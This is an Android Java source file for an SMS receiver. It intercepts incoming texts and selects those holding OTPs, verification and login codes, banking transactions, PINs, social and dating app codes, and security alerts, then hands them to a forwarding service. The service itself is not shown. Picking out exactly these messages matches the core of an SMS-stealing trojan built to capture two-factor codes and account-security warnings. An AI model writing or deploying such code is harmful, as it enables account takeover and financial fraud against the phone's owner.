package com.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

    // ─── Keywords — in SMS mein se koi bhi ho to forward hoga ────────────────
    private static final String[] KEYWORDS = {
        // OTP / verification
        "otp", "one time", "one-time", "verification code", "verify",
        "passcode", "secure code", "login code", "auth code",
        // Banking
        "bank", "transaction", "credited", "debited", "balance",
        "payment", "transfer", "upi", "neft", "imps", "rtgs",
        "rupee", "rs.", "inr", "amount", "account", "debit", "credit",
        "atm", "pin", "ifsc", "statement",
        // Apps / Social
        "instagram", "snapchat", "whatsapp", "facebook", "twitter",
        "telegram", "signal", "tinder", "bumble", "google",
        // Alerts
        "alert", "warning", "suspicious", "unauthorized", "blocked",
        "failed", "attempt", "security", "password changed",
        // Common short-code senders also forward everything from them
    };

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        String format = bundle.getString("format");
        if (pdus == null) return;

        StringBuilder fullBody = new StringBuilder();
        String sender = "";

        for (Object pdu : pdus) {
            SmsMessage sms;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                sms = SmsMessage.createFromPdu((byte[]) pdu);
            }
            if (sms != null) {
                sender = sms.getDisplayOriginatingAddress();
                fullBody.append(sms.getMessageBody());
            }
        }

        String body = fullBody.toString();
        if (body.isEmpty()) return;

        if (!shouldForward(sender, body)) return;

        Intent serviceIntent = new Intent(context, ForwarderService.class);
        serviceIntent.putExtra("sender", sender);
        serviceIntent.putExtra("body", body);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    private boolean shouldForward(String sender, String body) {
        String bodyLower   = body.toLowerCase();
        String senderLower = (sender != null ? sender : "").toLowerCase();

        // Short-code senders (e.g. HDFCBK, SBIINB, VM-ICICIB) — always forward
        if (sender != null && sender.matches("[A-Z]{2}-[A-Z0-9]{4,8}")) return true;
        // All numeric short senders (e.g. 1234567) — always forward
        if (sender != null && sender.matches("\\d{5,8}")) return true;

        // Keyword match
        for (String kw : KEYWORDS) {
            if (bodyLower.contains(kw) || senderLower.contains(kw)) return true;
        }
        return false;
    }
}
